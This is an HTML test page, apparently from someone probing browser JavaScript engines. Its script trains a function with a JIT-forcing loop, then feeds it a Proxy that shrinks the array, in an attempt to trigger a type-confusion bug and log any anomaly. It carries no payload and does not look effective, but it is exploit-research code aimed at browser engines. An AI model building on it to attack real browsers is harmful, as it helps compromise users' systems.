<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Gadget Test - Type Confusion</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      padding: 20px;
    }
    #log {
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>Iniciando gadgets...</h1>
  <div id="log">Pronto...</div>

  <script>
    const logElement = document.getElementById("log");
    let logData = '';

    function log(msg) {
      logData += msg + "\\n";
      logElement.textContent = logData;
    }

    function aggressiveGadget3() {
      let arr = [1.1, 2.2, 3.3, 4.4];
      let evil = {
        get: function(target, prop, receiver) {
          if (prop === "length") {
            arr.length = 1;
          }
          return Reflect.get(target, prop, receiver);
        }
      };

      let proxy = new Proxy(arr, evil);

      function confuse(o) {
        return o[2]; // espera double, pode causar type confusion
      }

      for (let i = 0; i < 100000; i++) confuse(arr); // forÃ§a JIT

      let res = confuse(proxy);
      log("[gadget3] Anomalia detectada: " + res);
    }

    setTimeout(() => {
      log("Pronto para iniciar...");
      log("Iniciando gadgets...\\n");
      aggressiveGadget3();
      log("\\nFinalizado.");
    }, 1500);
  </script>
</body>
</html>
